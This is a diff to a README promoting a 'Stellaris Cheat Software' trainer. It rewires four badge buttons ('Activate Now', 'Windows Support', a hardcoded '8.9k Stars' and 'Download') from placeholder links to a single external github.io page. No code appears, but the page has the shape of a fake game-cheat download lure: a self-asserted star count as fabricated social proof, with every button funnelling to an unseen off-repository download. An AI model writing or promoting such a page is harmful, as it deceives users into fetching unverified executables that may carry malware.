@@ -2,10 +2,10 @@
 
 The **Stellaris Cheat Software** gives players full control over their empire and fleets with a clean overlay menu and customizable configs. Whether you want to **speed up research, boost resources, or create invincible ships**, this trainer makes galaxy building faster, smoother, and more creative.
 
-[![Activate Now](https://img.shields.io/badge/Activate%20Now-purple?style=for-the-badge\&logo=rocket)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](#)
-[![⭐️ 8.9k Stars](https://img.shields.io/badge/⭐️%208.9k-Stars-yellow?style=for-the-badge\&logo=github)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](#)
+[![Activate Now](https://img.shields.io/badge/Activate%20Now-purple?style=for-the-badge\&logo=rocket)](https://stellaris-cheat.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](https://stellaris-cheat.github.io/.github/)
+[![⭐️ 8.9k Stars](https://img.shields.io/badge/⭐️%208.9k-Stars-yellow?style=for-the-badge\&logo=github)](https://stellaris-cheat.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](https://stellaris-cheat.github.io/.github/)
 
 ---
 
